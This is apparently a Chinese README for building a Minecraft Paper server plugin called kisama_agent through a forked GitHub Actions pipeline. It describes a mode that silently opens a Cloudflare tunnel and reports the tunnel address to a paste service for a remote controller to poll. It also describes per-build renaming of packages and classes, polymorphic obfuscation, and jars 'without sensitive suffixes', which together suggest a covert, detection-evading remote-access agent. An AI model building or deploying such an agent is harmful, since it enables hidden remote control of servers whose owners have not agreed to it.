# kisama_agent_jplugin
kisama_agent for paper plugin

## 🚀 核心使用流水线（三步通关）

### 第一步：Fork 本仓库
1. 登录你的 GitHub 账号。
2. 点击本仓库右上角的 **Fork** 按钮，将项目复制到你自己的账户下。

### 第二步：激活 GitHub Actions 引擎
由于 GitHub 的安全策略，新 Fork 的仓库默认会挂起自动化流水线，需要手动释放：
1. 进入你 Fork 后的新仓库，点击顶部导航栏的 **Actions** 选项卡。
2. 你会看到一个绿色的提示页面，直接点击 **"I understand my workflows, go ahead and enable them"** 按钮。

### 第三步：手动触发多态变异构建
1. 在 **Actions** 页面左侧的流水线列表中，点击 **`Polymorphic Plugin CI/CD Pipeline`**。
2. 在右侧弹出的灰色浮窗中，点击 **Run workflow** 按钮。
3. 根据你的部署需求，在表单中填写核心网络特征及指纹置换参数：

| 输入项 | 属性 | 说明 | 示例值 |
| :--- | :---: | :--- | :--- |
| **ECDSA_PUBKEY** | `必填` | 核心代理安全认证的 Base64 签名公钥 | `MFkwEwYHKoZIzj0CAQYIKo...` |
| **ECIES_PUBKEY** | `必填` | 端到端加密终端通信的 Base64 公钥 | `BGoN7yXqZp1smvW2M9A...` |
| **KPORT** | `可选` | 代理底层的内控网络端口（留空则默认 `8000`） | `8443` |
| **KMODE** | `可选` | 启动模式开关（下拉选择，默认 `0`）：`0`=普通启动；`1`=启动时自动创建 trycloudflare 临时隧道 + 写域名文件 + stdin 指令监听；`2`=启动时自动建隧道 + 上报域名至 shz.al（全程静默）。详见上游 `docs/API.MD` 第九节 | `2` |
| **KPATH** | `可选` | 隧道域名文件写入路径，仅 `KMODE=1` 有效（支持 `$HOME` 前缀，留空默认 `$HOME/domain.txt`） | `$HOME/.cache/domain.txt` |
| **KNAME** | `可选` | shz.al 自定义名，仅 `KMODE=2` 有效（≥3 字符，限字母数字及 `+_-[]*$=@,;/`）；缺失或非法时代理端静默退化为普通启动 | `env01a` |
| **KNAME_KEY** | `可选` | shz.al 管理/修改密钥，仅 `KMODE=2` 有效（留空复用 `KNAME` 本身） | `s3cret-key` |
| **ORG** | `可选` | 彻底洗涤旧组织名特征，重构 Package 路径（留空则不改） | `mycrypto` |
| **PACKAGE** | `可选` | 彻底重构插件主类名与 Jar 包物理名称（留空则不改） | `HyperEngine` |
| **VERSION** | `可选` | 自定义本次编译生成的插件版本号（留空沿用老版本） | `1.2.5` |

4. 填写完毕后，点击绿色的 **Run workflow** 正式启动云端构建。

> 💡 **KMODE 注入说明**：`KMODE/KPATH/KNAME/KNAME_KEY` 会在构建时被烘焙进插件内 kisama.java 的缺省配置。运行期优先级为：**服务器进程真实环境变量 > 插件 jar 同目录 `.env` 文件 > 构建时烘焙的缺省值**，因此无需重新编译也可通过在 `plugins/` 下放置 `.env`（或在服主启动脚本中 export）临时覆盖。临时隧道为 Java 版内置的 trycloudflare 快速隧道实现，**无需**在服务器上安装 cloudflared 二进制；KMODE=2 的控制端通过 `GET https://shz.al/~<KNAME>` 轮询即可拿到隧道域名。

---

## 📦 最终产物下载

1. 等待构建流水线变为绿色对勾（通常耗时 1~2 分钟，混淆器在全盘施展多态控制流平坦化）。
2. 点击进入该次构建的详情页，滑动至页面最底部。
3. 在 **Artifacts** 区域，你会看到以你指定的主类名命名的产物。
4. **直接点击即可下载**。得益于免 ZIP 直传技术，下载下来的直接就是标准的、无敏感后缀的原生 `.jar` 插件包，扔进服务器的 `plugins` 文件夹即可直接开服交叉联测！